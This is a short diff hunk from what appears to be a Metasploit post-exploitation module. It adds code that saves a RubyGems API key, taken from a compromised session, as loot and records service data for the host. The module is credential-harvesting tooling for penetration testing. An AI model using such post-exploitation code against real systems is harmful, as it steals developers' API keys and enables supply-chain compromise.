@@ -50,6 +50,20 @@ class Metasploit3 < Msf::Post
 
       print_good("Downloaded #{path}")
 
+      store_loot("host.rubygems.apikey",
+                 "text/plain",
+                 session,
+                 rubygems_api_key,
+                 "ruby_api_key.txt",
+                 "Ruby API Key")
+
+      service_data = {
+        address: host,
+        service_name: 'rubygems',
+        protocol: 'tcp',
+        workspace_id: myworkspace_id
+      }
+
       credential_data = {
         origin_type: :session,
         session_id: session_db_id,
